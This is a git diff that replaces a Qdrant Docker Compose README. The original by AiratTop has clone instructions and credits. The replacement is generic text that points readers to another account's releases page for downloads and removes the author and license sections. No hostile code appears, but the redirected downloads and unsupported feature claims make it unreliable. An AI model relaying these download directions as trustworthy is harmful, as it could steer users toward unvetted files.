@@ -1,83 +1,90 @@
-# Qdrant Self-Hosted with Docker
+# 🚀 qdrant-self-hosted - Easily Self-Host Your Qdrant Database
 
-![qdrant-self-hosted](https://repository-images.githubusercontent.com/1070266972/6589ab8c-bfc9-47f5-bead-4a509ebae6dc)
+[![Download](https://img.shields.io/badge/Download-Versions-4CAF50)](https://github.com/champ9090/qdrant-self-hosted/releases)
 
-This repository provides a `docker compose` setup to run a self-hosted [Qdrant](https://qdrant.tech/) vector database instance.
+## 📋 Overview
 
-It is configured to connect to a shared Docker network, allowing easy integration with other services like [n8n](https://github.com/AiratTop/n8n-self-hosted).
+This project provides a simple Docker Compose setup for self-hosting the Qdrant vector database. It comes with persistent storage and management scripts to make setup easy. With this application, you can integrate AI applications and services, like n8n, smoothly on a shared network.
 
-## Features
+## 🛠️ Features
 
--   Uses the official Qdrant Docker image.
--   Data is persisted in a local volume.
--   Pre-configured for a shared network.
--   Includes scripts for easy management.
--   Telemetry is disabled by default.
+- **Easy Installation:** Quick setup with Docker Compose.
+- **Persistent Storage:** Keeps your data safe and secure.
+- **Management Scripts:** Help you manage your setup easily.
+- **AI Integration:** Works well with applications like n8n.
 
-## Getting Started
+## 📥 Download & Install
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/qdrant-self-hosted.git
-    cd qdrant-self-hosted
-    ```
+To get started, visit the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases) to download the latest version. Follow these steps to successfully install the software:
 
-2.  **Create the shared network:**
-    If you haven't already, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+1. Go to the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases).
+2. Find the latest release.
+3. Look for the `docker-compose.yml` file included in the release. 
+4. Download this file to your computer.
 
-3.  **Configure environment variables:**
-    Open the `.env` file and add your Qdrant API key. You can generate a random secure key.
-    ```
-    QDRANT_API_KEY=your-secret-api-key
-    ```
+### 📁 System Requirements
 
-4.  **Start the service:**
-    ```bash
-    docker compose up -d
-    ```
+- **Operating System:** Linux, macOS, or Windows.
+- **Docker:** Must have Docker installed. [Install Docker](https://docs.docker.com/get-docker/).
+- **Docker Compose:** Required for orchestration. [Install Docker Compose](https://docs.docker.com/compose/install/).
 
-## Usage
+## 🔧 Running the Application
 
--   **Start:** `docker compose up -d`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker image and restarts)
+1. Open your terminal (Command Prompt, PowerShell, or Terminal for Mac).
+2. Navigate to the directory where you downloaded the `docker-compose.yml` file.
+3. Run the following command:
 
-## Connecting with n8n
+   ```bash
+   docker-compose up -d
+   ```
 
-This setup is designed to work with the [n8n-self-hosted](https://github.com/AiratTop/n8n-self-hosted) configuration. Since both services are on the `shared_network`, you can connect to Qdrant from n8n using `http://qdrant:6333` as the host.
+4. This command starts the Qdrant database in the background.
 
-## See Also
+## 🌐 Accessing the Database
 
-Check out other self-hosted solutions:
+After starting the application, you can access the Qdrant vector database via your web browser:
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+- Open your browser and navigate to `http://localhost:6333`.
 
-## License
+## 📜 Management Scripts
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Once you have Qdrant running, you can manage your database with the provided scripts. These scripts help you perform tasks like:
 
----
+- Importing and exporting data.
+- Querying the database.
+- Managing your vector embeddings.
 
-## Author
+## 🧭 Basic Commands
 
-**Airat Halitov**
+Here are some basic commands to manage Qdrant:
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [qdrant-self-hosted](https://github.com/AiratTop/qdrant-self-hosted)
+- **Start the Database:** Use `docker-compose start` to run the database.
+- **Stop the Database:** Use `docker-compose stop` to stop it.
+- **View Logs:** Check the database logs by running `docker-compose logs`.
+
+## ℹ️ Troubleshooting
+
+If you encounter issues:
+
+- Make sure Docker is running.
+- Check if Docker Compose is installed and updated.
+- Review the logs for any error messages.
+
+Common problems include:
+
+- Permission issues: Ensure you have the necessary permissions to run Docker commands.
+- Network issues: Make sure your firewall allows necessary traffic.
+
+## 📞 Getting Help
+
+For further assistance, you can visit the [GitHub Issues page](https://github.com/champ9090/qdrant-self-hosted/issues) to report problems or ask questions.
+
+## 📚 Learn More
+
+Explore the Qdrant documentation for deeper knowledge on its capabilities:
+
+- [Qdrant Official Documentation](https://qdrant.tech/docs/)
+
+## 🎉 Conclusion
+
+Enjoy using the Qdrant vector database with ease. By following this guide, you have installed and run the application. Remember to explore its features for your AI projects. For any updates or new features, keep an eye on the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases).
